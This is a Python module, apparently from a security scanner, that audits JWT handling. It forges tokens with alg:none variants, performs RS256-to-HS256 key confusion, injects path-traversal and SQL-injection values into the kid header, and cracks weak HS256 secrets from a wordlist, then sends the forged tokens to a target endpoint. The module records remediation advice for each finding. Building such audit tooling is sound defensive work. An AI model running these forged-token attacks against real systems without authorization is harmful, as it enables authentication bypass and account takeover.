"""
JWT (JSON Web Token) security audit engine.

Full attack surface:
1. alg:none bypass (multiple case variants)
2. RS256→HS256 key confusion (asymmetric→symmetric downgrade)
3. kid parameter path traversal and SQLi injection
4. Weak secret offline cracking (common passwords + hashcat bridge)
5. Token expiry and claim validation
6. JWK/JWKS endpoint injection
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import time
from typing import Optional

import structlog

from nightfall.core.http import Evidence

logger = structlog.get_logger(__name__)


# ── JWT Helpers ──────────────────────────────────────────────────────────────

def b64url_decode(data: str) -> bytes:
    """Base64url decode (no padding)."""
    padding = 4 - len(data) % 4
    if padding != 4:
        data += "=" * padding
    return base64.urlsafe_b64decode(data)


def b64url_encode(data: bytes) -> str:
    """Base64url encode (no padding)."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def decode_jwt(token: str) -> tuple[dict, dict, str]:
    """Decode a JWT without verification. Returns (header, payload, signature)."""
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError(f"Invalid JWT: expected 3 parts, got {len(parts)}")

    header = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))
    signature = parts[2]
    return header, payload, signature


def forge_jwt(header: dict, payload: dict | str, secret: str | bytes = "") -> str:
    """Forge a JWT with custom header/payload and optional HMAC signing.

    Args:
        header: JWT header dict (must include 'alg').
        payload: JWT payload dict or raw payload string.
        secret: HMAC secret for HS256/HS384/HS512 signing. Empty = unsigned.

    Returns:
        Forged JWT string.
    """
    if isinstance(payload, str):
        payload_json = payload
    else:
        payload_json = json.dumps(payload, separators=(",", ":"))

    header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode())

    if isinstance(payload, dict):
        payload_b64 = b64url_encode(payload_json.encode())
    else:
        payload_b64 = b64url_encode(payload.encode())

    signing_input = f"{header_b64}.{payload_b64}"

    alg = header.get("alg", "none").lower()
    if alg in ("none", ""):
        signature = ""
    elif alg == "hs256":
        if isinstance(secret, str):
            secret = secret.encode()
        sig = hmac.new(secret, signing_input.encode(), hashlib.sha256).digest()
        signature = b64url_encode(sig)
    elif alg == "hs384":
        if isinstance(secret, str):
            secret = secret.encode()
        sig = hmac.new(secret, signing_input.encode(), hashlib.sha384).digest()
        signature = b64url_encode(sig)
    elif alg == "hs512":
        if isinstance(secret, str):
            secret = secret.encode()
        sig = hmac.new(secret, signing_input.encode(), hashlib.sha512).digest()
        signature = b64url_encode(sig)
    else:
        signature = ""  # Can't sign with RSA/EC here

    return f"{header_b64}.{payload_b64}.{signature}"


# ── Common Weak Secrets ──────────────────────────────────────────────────────

COMMON_SECRETS = [
    "secret", "password", "123456", "changeme", "key", "jwt",
    "test", "admin", "private", "public", "default", "token",
    "signing-key", "secretkey", "mysecret", "supersecret",
    "jwt-secret", "your-256-bit-secret", "secret-key",
    "s3cr3t", "p@ssw0rd", "qwerty", "1234567890",
]


def crack_hs256(token: str, wordlist: list[str] | None = None) -> Optional[str]:
    """Offline brute-force crack of HS256 JWT using a wordlist.

    Args:
        token: The JWT to crack.
        wordlist: List of candidate secrets.

    Returns:
        The secret if found, None otherwise.
    """
    wordlist = wordlist or COMMON_SECRETS
    parts = token.split(".")
    if len(parts) != 3:
        return None

    signing_input = f"{parts[0]}.{parts[1]}".encode()
    target_sig = b64url_decode(parts[2])

    for secret in wordlist:
        computed = hmac.new(
            secret.encode(), signing_input, hashlib.sha256
        ).digest()
        if hmac.compare_digest(computed, target_sig):
            return secret

    return None


# ── JWT Audit Engine ─────────────────────────────────────────────────────────

class JWTAuditor:
    """Full JWT attack surface audit."""

    def __init__(self, pool):
        self.pool = pool

    async def audit(self, token: str, ctx, endpoint: str = "/api/me") -> list[Evidence]:
        """Run all JWT attacks against the given token and validation endpoint.

        Args:
            token: The JWT to attack.
            ctx: Engine context with pool, oast, etc.
            endpoint: Endpoint that validates the JWT (e.g. /api/me, /api/profile).

        Returns:
            List of Evidence objects for each confirmed vulnerability.
        """
        findings: list[Evidence] = []

        try:
            header, payload, sig = decode_jwt(token)
        except (ValueError, json.JSONDecodeError) as e:
            logger.warning("jwt_decode_error", error=str(e))
            return findings

        logger.info(
            "jwt_audit_start",
            alg=header.get("alg"),
            claims=list(payload.keys()),
        )

        # ── 1. alg:none bypass ──────────────────────────────────────────
        for alg_variant in ("none", "None", "NONE", "nOnE", "nonE"):
            forged = forge_jwt(
                header={**header, "alg": alg_variant},
                payload=payload,
            )
            ev = await self.pool.send(
                "GET", endpoint,
                headers={"Authorization": f"Bearer {forged}"},
            )
            if ev.response_status == 200:
                ev.vuln_class = "jwt"
                ev.subtype = "alg-none"
                ev.payload = f"alg:{alg_variant}"
                ev.confidence = 0.95
                ev.severity = "critical"
                ev.evidence_snip = ev.response_body[:300]
                ev.remediation = (
                    "Reject tokens with alg=none. Use a strict allowlist of "
                    "accepted algorithms (e.g. RS256 only)."
                )
                findings.append(ev)
                logger.info("jwt_alg_none_accepted", variant=alg_variant)
                break  # one variant is enough

        # ── 2. RS256→HS256 key confusion ────────────────────────────────
        if header.get("alg", "").upper().startswith("RS"):
            # Try to fetch the public key from common JWKS endpoints
            jwks_urls = [
                f"{_base_url(endpoint)}/.well-known/jwks.json",
                f"{_base_url(endpoint)}/oauth/.well-known/jwks.json",
                f"{_base_url(endpoint)}/.well-known/openid-configuration",
            ]

            for jwks_url in jwks_urls:
                try:
                    jwks_ev = await self.pool.send("GET", jwks_url)
                    if jwks_ev.response_status == 200 and "keys" in jwks_ev.response_body:
                        # Try to extract public key and use as HMAC secret
                        # This is the RS→HS confusion attack
                        pub_key_material = jwks_ev.response_body.encode()[:256]
                        forged = forge_jwt(
                            header={**header, "alg": "HS256"},
                            payload=payload,
                            secret=pub_key_material,
                        )
                        confusion_ev = await self.pool.send(
                            "GET", endpoint,
                            headers={"Authorization": f"Bearer {forged}"},
                        )
                        if confusion_ev.response_status == 200:
                            confusion_ev.vuln_class = "jwt"
                            confusion_ev.subtype = "rs256-to-hs256"
                            confusion_ev.payload = "RSA public key used as HMAC secret"
                            confusion_ev.confidence = 0.95
                            confusion_ev.severity = "critical"
                            confusion_ev.evidence_snip = confusion_ev.response_body[:300]
                            confusion_ev.remediation = (
                                "Enforce algorithm verification on the server. "
                                "Do not allow HS256 when RS256 is expected. "
                                "Use separate key objects for symmetric/asymmetric."
                            )
                            findings.append(confusion_ev)
                            logger.info("jwt_rs_hs_confusion", jwks_url=jwks_url)
                except Exception:
                    continue

        # ── 3. kid parameter attacks ────────────────────────────────────
        kid_payloads = [
            ("../../../../dev/null", "", "path-traversal"),
            ("../../../../etc/passwd", "", "path-traversal"),
            ("' OR '1'='1", "a", "sqli"),
            ("1 UNION SELECT 'a'", "a", "sqli"),
            ("../../../../../../dev/null", "", "path-traversal"),
        ]

        for kid_value, secret, attack_type in kid_payloads:
            forged = forge_jwt(
                header={**header, "alg": "HS256", "kid": kid_value},
                payload=payload,
                secret=secret,
            )
            ev = await self.pool.send(
                "GET", endpoint,
                headers={"Authorization": f"Bearer {forged}"},
            )
            if ev.response_status == 200:
                ev.vuln_class = "jwt"
                ev.subtype = f"kid-{attack_type}"
                ev.payload = f"kid={kid_value}"
                ev.confidence = 0.9
                ev.severity = "critical"
                ev.evidence_snip = ev.response_body[:300]
                ev.remediation = (
                    "Validate the 'kid' parameter against an allowlist. "
                    "Do not use 'kid' for file system or database lookups. "
                    "Sanitize 'kid' values against path traversal and injection."
                )
                findings.append(ev)
                logger.info("jwt_kid_attack", kid=kid_value, type=attack_type)
                break  # one kid attack is enough to confirm

        # ── 4. Weak secret offline crack ────────────────────────────────
        if header.get("alg", "").upper().startswith("HS"):
            secret = crack_hs256(token)
            if secret:
                ev = Evidence(
                    url=endpoint,
                    method="GET",
                    vuln_class="jwt",
                    subtype="weak-secret",
                    payload=f"secret={secret}",
                    confidence=0.95,
                    severity="critical",
                    evidence_snip=f"JWT secret cracked: '{secret}'",
                    remediation=(
                        "Use a cryptographically strong random secret (>=256 bits). "
                        "Consider using asymmetric algorithms (RS256, ES256) instead."
                    ),
                )
                findings.append(ev)
                logger.info("jwt_weak_secret", secret=secret)

        # ── 5. Token expiry check ───────────────────────────────────────
        exp = payload.get("exp")
        if exp and isinstance(exp, (int, float)):
            if exp < time.time():
                # Token is expired — check if server still accepts it
                ev = await self.pool.send(
                    "GET", endpoint,
                    headers={"Authorization": f"Bearer {token}"},
                )
                if ev.response_status == 200:
                    ev.vuln_class = "jwt"
                    ev.subtype = "expired-token-accepted"
                    ev.confidence = 0.8
                    ev.severity = "medium"
                    ev.evidence_snip = f"Expired token (exp={exp}) still accepted"
                    ev.remediation = "Validate token expiry (exp claim) server-side."
                    findings.append(ev)

        if not exp:
            ev = Evidence(
                url=endpoint,
                method="GET",
                vuln_class="jwt",
                subtype="no-expiry",
                confidence=0.5,
                severity="medium",
                evidence_snip="JWT has no 'exp' claim — tokens never expire",
                remediation="Always include an 'exp' claim with a reasonable TTL.",
            )
            findings.append(ev)

        return findings


async def jwt_engine(ctx, step: dict, obj) -> Optional[Evidence]:
    """Entry point for JWT audit. Extracts token from step context."""
    token = step.get("params", {}).get("token", "")
    endpoint = step.get("endpoint", "/api/me")

    if not token:
        # Try to extract from a previous response
        if hasattr(ctx, "db"):
            token = await _extract_jwt_from_history(ctx)

    if not token:
        logger.debug("jwt_no_token", endpoint=endpoint)
        return None

    auditor = JWTAuditor(ctx.pool)
    findings = await auditor.audit(token, ctx, endpoint)
    return findings[0] if findings else None


async def _extract_jwt_from_history(ctx) -> str:
    """Try to find a JWT in the evidence log."""
    import re
    jwt_pattern = re.compile(r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+")

    for ev in reversed(ctx.pool.evidence_log[-100:]):
        # Check response headers (Authorization, Set-Cookie)
        for key, val in ev.response_headers.items():
            match = jwt_pattern.search(str(val))
            if match:
                return match.group()
        # Check response body
        match = jwt_pattern.search(ev.response_body[:5000])
        if match:
            return match.group()

    return ""


def _base_url(endpoint: str) -> str:
    """Extract base URL from an endpoint."""
    from urllib.parse import urlparse
    parsed = urlparse(endpoint)
    return f"{parsed.scheme}://{parsed.netloc}" if parsed.scheme else ""
